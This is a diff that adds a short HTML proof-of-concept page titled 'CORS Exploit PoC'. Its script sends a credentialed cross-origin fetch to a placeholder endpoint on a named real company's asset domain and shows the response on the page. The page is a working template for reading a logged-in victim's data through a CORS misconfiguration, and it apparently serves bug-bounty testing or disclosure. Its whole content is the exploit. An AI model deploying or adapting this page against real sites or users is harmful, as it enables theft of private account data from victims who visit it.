@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS Exploit PoC</h2>
+    <pre id="output">Loading...</pre>
+
+    <script>
+      fetch("https://consumer-static-assets.wolt.com/your_target_endpoint", {
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").innerText = data;
+      })
+      .catch(err => {
+        document.getElementById("output").innerText = "Error: " + err;
+      });
+    </script>
+  </body>
+</html>
